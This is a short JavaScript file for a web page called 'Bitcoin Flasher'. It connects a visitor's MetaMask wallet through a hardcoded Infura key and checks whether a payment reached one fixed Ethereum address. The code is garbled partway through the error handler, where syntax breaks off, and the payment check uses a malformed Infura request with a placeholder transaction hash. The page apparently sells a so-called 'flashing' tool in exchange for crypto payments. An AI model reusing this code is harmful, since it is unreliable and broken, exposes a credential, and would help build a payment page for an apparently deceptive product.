const MMSDK = new MetaMaskSDK.MetaMaskSDK({
    dappMetadata: {
        name: "Bitcoin Flasher",
    },
    infuraAPIKey: "14a2fca0d32a4027b61696b60c059bec",
});

// Connect MetaMask on button click
document.getElementById("connectButton").addEventListener("click", async () => {
    try {
        await MMSDK.connect();
        console.log("MetaMask connected successfully!");
        alert("MetaMask Connected!");
    } catch (error) {
        console.error("Error connecting MetaMask:", error);
        alert("Failed to connect MetaMask. Please try another    (const (error) {
        window.location.href = "https://metamask.app/";
    }
});

function verifyPayment() {
    const infuraURL = "https://mainnet.infura.io/v3/14a2fca0d32a4027b61696b60c059bec";
    const walletAddress = "0x3A06322e9F1124F6B2de8F343D4FDce4D1009869";

    fetch(`${infuraURL}/eth_getTransactionByHash?txHash=yourTxHash`)
        .then(response => response.json())
        .then(data => {
            if (data.result && data.result.to.toLowerCase() === walletAddress.toLowerCase()) {
                alert("Payment Verified! Please check your email for confirmation.");
            } else {
                alert("Payment not verified. Please try again.");
            }
        })
        .catch(error => alert("Error verifying payment."));
}
